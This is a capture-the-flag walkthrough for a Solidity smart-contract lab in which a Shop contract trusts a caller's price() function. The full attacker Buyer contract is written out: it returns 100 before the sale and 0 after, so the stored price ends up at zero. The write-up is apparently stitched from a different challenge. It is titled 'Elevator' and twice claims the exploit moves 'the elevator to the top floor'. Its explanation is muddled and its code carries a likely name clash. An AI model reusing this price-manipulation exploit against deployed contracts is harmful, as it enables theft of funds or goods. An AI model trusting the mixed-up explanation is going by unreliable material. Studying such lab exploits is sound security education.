# Elevator

## Challenge Description

Сan you get the item from the shop for less than the price asked?

##### Things that might help:

- `Shop` expects to be used from a `Buyer`
- Understanding restrictions of view functions

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

```

## Challenge Solution Walkthrough

In this challenge, we exploit the `Shop` contract by creating our own `Buyer` contract with a modified `price()` function. By controlling the behavior of `price()`, we can bypass the condition in the `Shop` contract and move the elevator to the top floor.

Here's an example implementation of the `Buyer` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Buyer {
    Shop public shop;

    constructor(address shopAddress) {
        shop = Shop(shopAddress);
    }

    function price() public view returns (uint256) {
        if (shop.isSold() == false) {
            return 100;  // Return a price of 100 when the product is not sold
        } else {
            return 0;    // Return a price of 0 when the product is sold
        }
    }

    function solveChallenge() public {
        shop.buy();  // Call the buy() function of the Shop contract
    }
}
```

The `Buyer` contract has a `solveChallenge()` function that calls the `buy()` function of the `Shop` contract.

Inside the `Buyer` contract, we implement our own `price()` function. This function checks if the product is sold or not by calling the `isSold()` function of the `Shop` contract. If the product is not sold, it returns a price of `100`. This allows us to pass the condition in the `Shop` contract and proceed with the purchase. However, if the product is already sold, our `price()` function returns `0`, effectively bypassing the condition in the `Shop` contract and allowing us to buy the product for free.

By executing the `solveChallenge()` function of the `Buyer` contract, we trigger the modified `price()` function and exploit the vulnerability in the `Shop` contract. As a result, we can successfully move the elevator to the top floor without paying for the product.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.
